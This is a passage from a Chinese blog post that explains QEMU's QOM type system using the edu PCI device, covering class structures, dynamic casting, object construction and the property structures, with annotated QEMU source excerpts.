ID），配置空间偏移 0x00</span></span><br><span class="line">    <span class="type">uint16_t</span> device_id;            <span class="comment">// PCI Device ID（设备 ID），配置空间偏移 0x02</span></span><br><span class="line">    <span class="type">uint8_t</span>  revision;             <span class="comment">// Revision ID（修订号），配置空间偏移 0x08</span></span><br><span class="line">    <span class="type">uint16_t</span> class_id;             <span class="comment">// Class Code（类码，高 3 字节中的高 2 字节+子类），用于标识设备类别</span></span><br><span class="line">    <span class="type">uint16_t</span> subsystem_vendor_id;  <span class="comment">/* 仅对 Header Type = 0（普通端点设备）有效：子系统厂商 ID */</span></span><br><span class="line">    <span class="type">uint16_t</span> subsystem_id;         <span class="comment">/* 仅对 Header Type = 0（普通端点设备）有效：子系统设备 ID */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 标记该类是否为“PCI-to-PCI 桥”设备（true）或普通端点设备（false）。</span></span><br><span class="line"><span class="comment">     * 注意：这里并不表示“主机桥”(PCI Host Bridge)。</span></span><br><span class="line"><span class="comment">     * 当支持 CardBus Bridge 时，这里可能会进一步扩展。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> is_bridge;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 选项 ROM（Option ROM）文件名；若设置，会通过 ROM BAR 暴露给固件/驱动 */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *romfile;</span><br><span class="line">&#125; PCIDeviceClass;</span><br></pre></td></tr></table></figure></div>

<p><code>PCIDeviceClass</code> 表明了类属 PCI 设备的一些信息，如表示设备商信息的 <code>vendor_id</code> 和设备信息 <code>device_id</code> 以及读取 PCI 设备配置空间的 <code>config_read</code> 和 <code>config_write</code> 函数。值得注意的是，一个域是第一个成员 <code>DeviceClass</code> 的结构体，这描述的是属于“设备类型”的类型所具有的一些属性。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectClass:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The base for all classes.  The only thing that #ObjectClass contains is an</span></span><br><span class="line"><span class="comment"> * integer type handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line"></span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line"></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass parent_class;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>DeviceClass</code> 定义了设备类型相关的基本信息以及基本的回调函数，第一个域也是表示其父类型的 Class，为 <code>ObjectClass</code> 。 <code>ObjectClass</code> 是所有类型的基础，会内嵌到对应的其他 Class 的第一个域中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/530a3fad4d8261b8ad3ba91b35561a49.png"
                      alt="在这里插入图片描述"
                ></p>
<p>在 <code>type_initialize</code> 中会调用以下代码来对父类型所占的这部分空间进行初始化。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">parent = type_get_parent(ti);</span><br><span class="line"><span class="keyword">if</span> (parent) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ti-&gt;class, parent-&gt;class, parent-&gt;class_size);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="keyword">if</span> (ti-&gt;class_init) &#123;</span><br><span class="line">    ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 edu 设备来说这里的 <code>class_init</code> 为 <code>edu_class_init</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edu_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(class);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_edu_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span> = pci_edu_uninit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e8</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>类型转换 <code>DEVICE_CLASS</code> 和 <code>PCI_DEVICE_CLASS</code> 最终调用的函数为 <code>object_class_dynamic_cast</code> 。</p>
<p>函数首先通过 <code>type_get_by_name</code> 得到要转到的 <code>TypeImpl</code>，这里的 <code>typename</code> 是 <code>TYPE_PCI_DEVICE</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据给定类型名 typename，对一个类对象 ObjectClass* 进行“动态转型”。</span></span><br><span class="line"><span class="comment">// 成功：</span></span><br><span class="line"><span class="comment">//   - 若目标是“类/基类”，返回原始的 class 指针（k 本身）；</span></span><br><span class="line"><span class="comment">//   - 若目标是“接口类型”，返回该接口对应的 InterfaceClass*（注意不是原始 class）；</span></span><br><span class="line"><span class="comment">// 失败：返回 NULL（包括目标类型未知、层次不兼容、或接口匹配产生二义性）。</span></span><br><span class="line">ObjectClass *<span class="title function_">object_class_dynamic_cast</span><span class="params">(ObjectClass *class,</span></span><br><span class="line"><span class="params">                                       <span class="type">const</span> <span class="type">char</span> *typename)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *ret = <span class="literal">NULL</span>;</span><br><span class="line">    TypeImpl *target_type;     <span class="comment">// 目标类型（运行期描述符）</span></span><br><span class="line">    TypeImpl *type;            <span class="comment">// 当前类对应的运行期类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!class) &#123;              <span class="comment">// 传入空指针，直接失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 快速路径：很多“叶子类”的场景能命中</span></span><br><span class="line"><span class="comment">     * 注意：这是指针比较（==），只有当 typename 与 class-&gt;type-&gt;name</span></span><br><span class="line"><span class="comment">     * 指向同一块常量/驻留字符串内存时才为真（例如调用方直接传入已有的名字指针，</span></span><br><span class="line"><span class="comment">     * 或项目将类型名做了字符串驻留/intern）。不满足则走后续通用路径。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    type = class-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> (type-&gt;name == typename) &#123;</span><br><span class="line">        <span class="keyword">return</span> class;          <span class="comment">// 目标类型与当前类型同名，直接返回原 class</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target_type = type_get_by_name(typename);  <span class="comment">// 把名字解析成 TypeImpl*</span></span><br><span class="line">    <span class="keyword">if</span> (!target_type) &#123;</span><br><span class="line">        <span class="comment">/* 目标类型名未知：转换失败 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果：当前类“挂了接口列表”，且“目标类型是接口（或其祖先接口）”</span></span><br><span class="line">    <span class="comment">// 则走“接口转换”路径</span></span><br><span class="line">    <span class="keyword">if</span> (type-&gt;class-&gt;interfaces &amp;&amp;</span><br><span class="line">            type_is_ancestor(target_type, type_interface)) &#123;</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        GSList *i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在当前类的接口链表上查找：有没有实现“目标接口（或其子接口）”</span></span><br><span class="line">        <span class="keyword">for</span> (i = class-&gt;interfaces; i; i = i-&gt;next) &#123;</span><br><span class="line">            ObjectClass *target_class = i-&gt;data;  <span class="comment">// 这是某个已附加到本类的 InterfaceClass*</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若该接口类的具体类型 target_class-&gt;type 是目标接口 target_type</span></span><br><span class="line">            <span class="comment">// 的后代（等于或派生），则认为匹配</span></span><br><span class="line">            <span class="keyword">if</span> (type_is_ancestor(target_class-&gt;type, target_type)) &#123;</span><br><span class="line">                ret = target_class;  <span class="comment">// 保存匹配到的接口类</span></span><br><span class="line">                found++;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 如果匹配到多个接口（产生二义性），不允许转换 */</span></span><br><span class="line">        <span class="keyword">if</span> (found &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            ret = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type_is_ancestor(type, target_type)) &#123;</span><br><span class="line">        <span class="comment">// 否则走“类/基类转换”路径：</span></span><br><span class="line">        <span class="comment">// 只要“当前类类型是目标类型的后代（等于或派生）”，就返回原 class</span></span><br><span class="line">        ret = class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;  <span class="comment">// 可能为 NULL（失败）、原 class（类转换），或接口类指针（接口转换）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以 edu 为例，<code>type-&gt;name</code> 是 <code>edu</code>，但是要转换到的却是 <code>TYPE_PCI_DEVICE</code>，所以会调用 <code>type_is_ancestor(&quot;edu&quot;，TYPE_PCI_DEVICE)</code> 来判断后者是否是前者的祖先。</p>
<p>在该函数中依次得到 edu 的父类型，然后判断是否与 <code>TYPE_PCI_DEVICE</code> 相等，由 edu 设备的 <code>TypeInfo</code> 可知其父类型为 <code>TYPE_PCI_DEVICE</code>，所以这个 <code>type_is_ancestor</code> 会成功，能够进行从 <code>ObjectClass</code> 到 <code>PCIDeviceClass</code> 的转换。这样就可以直接通过 <code>(PCIDeviceClass*)ObjectClass</code> 完成从 <code>ObjectClass</code> 到 <code>PCIDeviceClass</code> 的强制转换。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">type_is_ancestor</span><span class="params">(TypeImpl *type, TypeImpl *target_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(target_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if target_type is a direct ancestor of type */</span></span><br><span class="line">    <span class="keyword">while</span> (type) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == target_type) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        type = type_get_parent(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_get_parent</span><span class="params">(TypeImpl *type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123;</span><br><span class="line">        type-&gt;parent_type = type_get_by_name(type-&gt;parent);</span><br><span class="line">        <span class="keyword">if</span> (!type-&gt;parent_type) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Type &#x27;%s&#x27; is missing its parent &#x27;%s&#x27;\n&quot;</span>,</span><br><span class="line">                    type-&gt;name, type-&gt;parent);</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type-&gt;parent_type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="对象的构造与初始化"><a href="#对象的构造与初始化" class="headerlink" title="对象的构造与初始化"></a>对象的构造与初始化</h3><p>前面提到，首先每个类型指定一个 <code>TypeInfo</code> 注册到系统中，接着在系统运行初始化的时候会把 <code>TypeInfo</code> 转变成 <code>TypeImple</code> 放到一个哈希表中，这就是类型的注册。系统会对这个哈希表中的每一个类型进行初始化，主要是设置 <code>TypeImpl</code> 的一些域以及调用类型的 <code>class_init</code> 函数，这就是类型的初始化。现在系统中已经有了所有类型的信息并且这些类型的初始化函数已经调用了，接着会根据需要（如 QEMU 命令行指定的参数）创建对应的实例对象，也就是各个类型的 object 。</p>
<p>下面来分析指定 <code>-device edu</code> 命令的情况。在 main 函数中有这么一句话。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu_opts_foreach(qemu_find_opts(<span class="string">&quot;device&quot;</span>),</span><br><span class="line">                  device_init_func, <span class="literal">NULL</span>, &amp;error_fatal);</span><br></pre></td></tr></table></figure></div>

<p>对每一个 <code>-device</code> 的参数，会调用 <code>device_init_func</code> 函数，该函数随即调用 <code>qdev_device_add</code> 进行设备的添加。通过 <code>object_new</code> 来构造对象，其调用链如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">device_init_func</span><br><span class="line">|   dev = qdev_device_add(opts, errp);</span><br><span class="line">|   |   dev = DEVICE(object_new(driver));</span><br><span class="line">|   |   |   TypeImpl *ti = type_get_by_name(typename);</span><br><span class="line">|   |   |   object_new_with_type(ti);</span><br><span class="line">|   |   |   |   obj = g_malloc(type-&gt;instance_size);</span><br><span class="line">|   |   |   |   object_initialize_with_type(obj, type-&gt;instance_size, type);</span><br><span class="line">|   |   |   |   |   object_init_with_type(obj, type); </span><br><span class="line">|   |   |   |   |   object_post_init_with_type(obj, type);</span><br><span class="line">|   |   object_property_set_bool(OBJECT(dev), <span class="literal">true</span>, <span class="string">&quot;realized&quot;</span>, &amp;err);               </span><br></pre></td></tr></table></figure></div>

<p><code>object_initialize_with_type</code> 的主要工作是对 <code>object_init_with_type</code> 和 <code>object_post_init_with_type</code> 进行调用，前者通过递归调用所有父类型的对象初始化函数和自身对象的初始化函数，后者调用 <code>TypeImpl</code> 的 <code>instance_post_init</code> 回调成员完成对象初始化之后的工作。下面以 edu 的 <code>TypeInfo</code> 为例进行介绍。</p>
<p>edu 的对象大小（<code>instance_size</code>）为 <code>sizeof(EduState)</code>，所以实际上一个 edu 类型的对象是 <code>EduState</code> 结构体，每一个对象都会有一个 <code>XXXState</code> 与之对应，记录了该对象的相关信息，若 edu 是一个 PCI 设备，那么 <code>EduState</code> 里面就会有这个设备的一些信息，如中断信息、设备状态、使用的 MMIO 和 PIO 对应的内存区域等。<br>在 <code>object_init_with_type</code> 函数中可以看到调用的参数都是一个 <code>Object</code> 。可以看出，对象之间实际也是有一种父对象与子对象的关系存在。与类型一样，QOM 中的对象也可以使用宏将一个指向 <code>Object</code> 对象的指针转换成一个指向子类对象的指针。转换过程与类型 <code>ObjectClass</code> 类似。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; EduState;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看出，不同于类型信息和类型，object 是根据需要创建的，只有在命令行指定了设备或者是热插一个设备之后才会有 object 的创建。类型和对象之间是通过 <code>Object</code> 的 <code>class</code> 域联系在一起的。这是在 <code>object_initialize_with_type</code> 函数中通过 <code>obj-&gt;class=type-&gt;class</code> 实现的。</p>
<p>从上文可以看出，可以把 QOM 的对象构造分成 3 部分：</p>
<ul>
<li>第一部分是类型的构造，通过 <code>TypeInfo</code> 构造一个 <code>TypeImpl</code> 的哈希表，这是在 main 之前完成的；</li>
<li>第二部分是类型的初始化，这是在 main 中进行的，这两部分都是全局的，也就是只要编译进去的 QOM 对象都会调用；</li>
<li>第三部分是类对象的构造，这是构造具体的对象实例，只有在命令行指定了对应的设备时，才会创建对象。</li>
</ul>
<p>现在只是构造出了对象，并且调用了对象初始化函数，但是 <code>EduState</code> 里面的数据内容并没有填充，这个时候的 edu 设备状态并不是可用的，对设备而言还需要设置它的 <code>realized</code> 属性为 true 才行。在 <code>qdev_device_add</code> 函数的后面，还有这样一句：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object_property_set_bool(OBJECT(dev), <span class="literal">true</span>, <span class="string">&quot;realized&quot;</span>, &amp;err);</span><br></pre></td></tr></table></figure></div>

<p>这句代码将 dev（也就是 edu 设备的 <code>realized</code> 属性）设置为 true ，这就涉及了 QOM 类和对象的另一个方面，即属性。</p>
<h3 id="QOM-中的属性"><a href="#QOM-中的属性" class="headerlink" title="QOM 中的属性"></a>QOM 中的属性</h3><p>在 QOM 中为了便于对对象进行管理，还给每种类型以及对象增加了属性。类属性存在于 <code>ObjectClass</code> 的 <code>properties</code> 域中，这个域是在类型初始化函数 <code>type_initialize</code> 中构造的。对象属性存放在 <code>Object</code> 的 <code>properties</code> 域中，这个域是在对象的初始化函数 <code>object_initialize_with_type</code> 中构造的。两者皆为一个哈希表，存着属性名字到 <code>ObjectProperty</code> 的映射。</p>
<p>属性由 <code>ObjectProperty</code> 表示。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    ObjectPropertyInit *init;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QObject *defval;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>name</code> 表示名字；<code>type</code> 表示属性的类型，如有的属性是字符串，有的是 bool 类型，有的是 link 等其他更复杂的类型；<code>get</code> 、<code>set</code> 、<code>resolve</code> 等回调函数则是对属性进行操作的函数；<code>opaque</code> 指向一个具体的属性，如 <code>BoolProperty</code> 等。</p>
<p>每一种具体的属性都会有一个结构体来描述它。比如下面的 ·<code>LinkProperty</code> 表示 link 类型的属性，<code>StringProperty</code> 表示字符串类型的属性，<code>BoolProperty</code> 表示 bool 类型的属性。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Object **targetp;</span><br><span class="line">        Object *target; <span class="comment">/* if OBJ_PROP_LINK_DIRECT, when holding the pointer  */</span></span><br><span class="line">        <span class="type">ptrdiff_t</span> offset; <span class="comment">/* if OBJ_PROP_LINK_CLASS */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">void</span> (*check)(<span class="type">const</span> Object *, <span class="type">const</span> <span class="type">char</span> *, Object *, Error **);</span><br><span class="line">    ObjectPropertyLinkFlags flags;</span><br><span class="line">&#125; LinkProperty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *(*get)(Object *, Error **);</span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">set</span>)(Object *, <span class="type">const</span> <span class="type">char</span> *, Error **);</span><br><span class="line">&#125; StringProperty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BoolProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">bool</span> (*get)(Object *, Error **);</span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">set</span>)(Object *, <span class="type">bool</span>, Error **);</span><br><span class="line">&#125; BoolProperty;</span><br></pre></td></tr></table></figure></div>

<p>以 <code>Object</code> 为例，属性相关结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/bc87d4005b61c96edce4574ca05e97cb.png"
                      alt="在这里插入图片描述"
                ></p>
<p>属性的添加分为类属性的添加和对象属性的添加，以对象属性为例，它的属性添加是通过 <code>object_property_add</code> 接口完成的。段忽略了属性 <code>name</code> 中带有通配符 <code>*</code> 的情况，该函数内容如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ObjectProperty *</span><br><span class="line"><span class="title function_">object_property_add</span><span class="params">(Object *obj, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *type,</span></span><br><span class="line"><span class="params">                    ObjectPropertyAccessor *get,</span></span><br><span class="line"><span class="params">                    ObjectPropertyAccessor *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                    ObjectPropertyRelease *release,</span></span><br><span class="line"><span class="params">                    <span class="type">void</span> *opaque, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop;</span><br><span class="line">    <span class="type">size_t</span> name_len = <span class="built_in">strlen</span>(name);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (object_property_find(obj, name, <span class="literal">NULL</span>) != <span 